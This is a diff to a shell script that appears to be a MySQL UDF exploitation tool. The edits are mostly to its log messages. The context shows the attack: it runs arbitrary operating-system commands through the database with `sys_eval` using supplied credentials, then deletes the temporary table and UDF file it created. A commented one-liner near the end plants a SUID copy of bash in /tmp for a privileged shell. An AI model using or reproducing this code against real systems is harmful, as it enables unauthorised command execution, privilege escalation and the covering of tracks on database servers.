@@ -51,7 +51,7 @@ function cleanup () {
 		then
 			echo "[+] Table $table_name successfully removed"
 		else
-			echo "Unable to remove table: $table_name"
+			echo "[-] Unable to remove table: $table_name"
 			echo "$output"
 		fi
 	fi
@@ -60,7 +60,7 @@ function cleanup () {
 	then
 		echo "[+] $tmp_udf successfully removed"
 	else
-		echo "Unable to remove temp udf file: $tmp_udf"
+		echo "[-] Unable to remove temp udf file: $tmp_udf"
 		echo "$output"
 	fi
 }
@@ -150,7 +150,9 @@ then
 else
 	cmd_input=$cmd
 	output=$((mysql --user=$username --password=$password --host=$host -e "select sys_eval('$cmd_input');")2>&1)
+	echo "[*] Running:\n $cmd_input"
 	printf "$output\n"
+	cleanup $table_name $tmp_udf
 fi
 # suid binary shell
 #r=$RANDOM;cp /bin/bash /tmp/$r && chmod +s /tmp/$r; echo "shell: /tmp/$r -p"
